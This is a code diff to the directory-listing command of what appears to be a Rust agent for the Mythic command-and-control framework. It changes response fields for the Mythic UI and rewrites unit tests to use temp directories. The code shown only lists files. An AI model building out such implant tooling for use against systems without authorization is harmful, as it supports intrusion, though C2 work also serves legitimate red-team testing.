@@ -25,9 +25,6 @@ struct Params {
     path: String,
     #[serde(default)]
     recursive: bool,
-    #[serde(default)]
-    #[allow(dead_code)]
-    host: Option<String>,
 }
 
 // ── Helpers ─────────────────────────────────────────────────
@@ -182,7 +179,8 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
     };
 
     if meta.is_file() {
-        // Single file listing
+        // Single file listing — surface the entry directly so the UI
+        // shows the file without us having to write a separate stdout.
         let entry = FileBrowserEntry {
             is_file: true,
             name: resolved
@@ -227,12 +225,15 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
                 .then_with(|| a.name.to_lowercase().cmp(&b.name.to_lowercase()))
         });
 
-        let count = files.len();
+        // The structured `file_browser` payload is what the Mythic UI
+        // consumes. The Python `LsCommand.process_response` writes a
+        // human-readable table via `MythicRPCTaskUpdate`. Avoid setting
+        // `user_output` here to prevent a duplicate summary in the UI.
         TaskResponse {
             task_id: task.id,
             completed: Some(true),
             status: Some("completed".into()),
-            user_output: Some(format!("{count} entries")),
+            user_output: None,
             file_browser: Some(FileBrowserEntry {
                 is_file: false,
                 name: resolved
@@ -258,20 +259,39 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use std::sync::atomic::{AtomicUsize, Ordering};
+
+    /// Per-test unique temp directory under the system temp dir. Avoids the
+    /// tests being sensitive to whatever `cargo test` set as the cwd.
+    fn unique_tmp(label: &str) -> std::path::PathBuf {
+        static COUNTER: AtomicUsize = AtomicUsize::new(0);
+        let n = COUNTER.fetch_add(1, Ordering::Relaxed);
+        let pid = std::process::id();
+        let mut p = std::env::temp_dir();
+        p.push(format!("nanaz-ls-test-{label}-{pid}-{n}"));
+        std::fs::create_dir_all(&p).expect("create temp dir");
+        p
+    }
 
     #[test]
     fn test_ls_current_dir() {
+        // Make a known directory with a known file so the assertion is
+        // independent of the process cwd.
+        let dir = unique_tmp("list");
+        std::fs::write(dir.join("hello.txt"), b"hi").unwrap();
+
         let task = TaskMessage {
             command: "ls".into(),
-            parameters: r#"{"path": "."}"#.into(),
+            parameters: serde_json::json!({ "path": dir.to_string_lossy() })
+                .to_string(),
             ..Default::default()
         };
         let resp = handle(&task);
-        assert!(resp.completed == Some(true));
-        assert!(resp.file_browser.is_some());
-        let fb = resp.file_browser.unwrap();
-        assert!(fb.success == Some(true));
-        assert!(!fb.files.is_empty());
+        let fb = resp.file_browser.expect("file_browser set");
+        assert_eq!(fb.success, Some(true));
+        assert!(!fb.files.is_empty(), "expected at least hello.txt in the listing");
+
+        let _ = std::fs::remove_dir_all(&dir);
     }
 
     #[test]
@@ -282,8 +302,7 @@ mod tests {
             ..Default::default()
         };
         let resp = handle(&task);
-        assert!(resp.file_browser.is_some());
-        let fb = resp.file_browser.unwrap();
-        assert!(fb.success == Some(false));
+        let fb = resp.file_browser.expect("file_browser set");
+        assert_eq!(fb.success, Some(false));
     }
 }
